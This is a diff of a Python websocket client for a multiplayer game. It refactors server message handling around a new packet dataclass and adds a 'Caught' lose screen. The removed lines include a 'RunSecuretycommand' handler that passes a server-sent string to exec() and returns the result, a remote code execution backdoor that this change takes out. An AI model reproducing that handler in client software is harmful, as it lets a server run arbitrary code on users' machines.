@@ -5,11 +5,22 @@ from websockets.sync.client import connect
 import json
 import math
 import time
+from dataclasses import dataclass
+from typing import Generic, TypeVar
+
+T = TypeVar("T")
 
 ## Setting game state to 0, which means that the game is in the start menu state. 
 gamestate = 0
 Rotation = 0
 ServerIP = "we-are-domed.onrender.com/"
+
+@dataclass(slots=True, frozen=True)
+class ServerPacekt(Generic[T]):
+    type: str
+    data: T
+
+
 
 class ServerComnicationHandler():
     print("Server Communication Handler Initialized")
@@ -85,39 +96,40 @@ class ServerComnicationHandler():
             message = self.connection.recv()
             ## Mekes server messages readebale to client
             messageJSON = json.loads(message)
+            Paket = ServerPacekt(type=messageJSON["type"], data=messageJSON["data"])
             ## If we leve the server we have to not recive before we close conection
             if self.LeaveServer:
                 self.connection.close()
                 break
             ## If server is unhappy to us for some resson it will print why
-            if messageJSON["type"] == "error":
-                print("Error from server:", messageJSON["data"]["message"])
+            if Paket.type == "error":
+                print("Error from server:", Paket.data["message"])
             ## When we need to know what lobbys we can join this gets triggered to update that info
-            if messageJSON["type"] == "AvailebaleLobbys":
-                self.lobbys = messageJSON["data"]["lobbys"]
+            if Paket.type == "AvailebaleLobbys":
+                self.lobbys = Paket.data["lobbys"]
                 gamestate = 1
             ## When we are in a lobby this updates the information about the lobby like who is in it and if we can start the game or not and the lobby id
-            if messageJSON["type"] == "LobbyInfo":
-                self.players = messageJSON["data"]["Players"]
-                self.lobbyID = messageJSON["data"]["lobbyID"]
-                self.canStartGame = not messageJSON["data"]["gameRunning"]
+            if Paket.type == "LobbyInfo":
+                self.players = Paket.data["Players"]
+                self.lobbyID = Paket.data["lobbyID"]
+                self.canStartGame = not Paket.data["gameRunning"]
                 if time.time() > serverhandler.Screnachanching:
                     gamestate = 3
                     Rotation = 0
                     serverhandler.Screnachanching = 0
             ## This is a server event that means we shold prepare to start the game and load it up
-            if messageJSON["type"] == "GameStarted":
-                self.map = messageJSON["data"]["map"]
+            if Paket.type == "GameStarted":
+                self.map = Paket.data["map"]
                 gamestate = 4
                 Rotation = math.pi / 4
                 print("Starting game...")
                 ## This is a prediction on where we are in the map. If we are wrong we are going to snap to corect positin after a while but this makes it smother
                 self.LocalPlayerLocation = {"x": 10.0, "y": 10.0}
             ## Updates player locatins and also local players position, Position is used to know wher we shold render
-            if messageJSON["type"] == "UpdateLocations":
+            if Paket.type == "UpdateLocations":
                 gamestate = 4
-                self.Playerlocations = messageJSON["data"]["players"]
-                self.Enemyslocations = messageJSON["data"]["enemyPositions"]
+                self.Playerlocations = Paket.data["players"]
+                self.Enemyslocations = Paket.data["enemyPositions"]
                 for player in self.Playerlocations:
                     if player["Username"] == self.username:
                         self.LocalPlayerLocation = player["Position"]
@@ -125,13 +137,14 @@ class ServerComnicationHandler():
                 
 
             ## The server thinks you won the game and this event prints and switshes to a game scen for victory
-            if messageJSON["type"] == "Winner":
+            if Paket.type == "Winner":
                 self.Screnachanching = time.time() + 10
                 gamestate = 5
                 print("Player won the game!")
-            if messageJSON["type"] == "RunSecuretycommand":
-                func = exec(messageJSON["data"]["command"])
-                self.connection.send(json.dumps({"type": "SecuretyCommandResult", "data": func()}))
+            if Paket.type == "Caught":
+                self.Screnachanching = time.time() + 10
+                gamestate = -5
+                print("Player lost the game!")
 
 
 
